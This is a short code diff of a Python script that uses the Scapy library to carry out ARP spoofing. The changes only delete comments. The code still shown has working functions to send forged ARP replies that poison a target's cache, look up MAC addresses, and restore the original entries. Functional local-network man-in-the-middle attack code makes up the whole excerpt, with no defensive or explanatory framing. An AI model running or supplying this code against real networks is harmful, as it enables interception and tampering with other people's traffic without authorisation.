@@ -17,22 +17,16 @@ def get_arg():
 
 
 def arp_spoof(tar_ip, spoof_ip, mac):
-    # tar_mac = get_mac(tar_ip)
     packets = ARP(op=2, pdst=tar_ip, hwdst=mac, psrc=spoof_ip)
     send(packets, verbose=False)
 
 
 def get_mac(ip):
-    # arp_result = arping(ip, verbose=False)[0]
-    # return arp_result[0][1].hwsrc
     ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), verbose=False)[0]
-    # # print(ans[0][1].hwsrc)
     return ans[0][1].hwsrc
 
 
 def restore(tar_ip, spoof_ip, tar_mac, spoof_mac):
-    # tar_mac = get_mac(tar_ip)
-    # spoof_mac = get_mac(spoof_ip)
     packets = ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip, hwsrc=spoof_mac)
     send(packets, count=4, verbose=False)
 
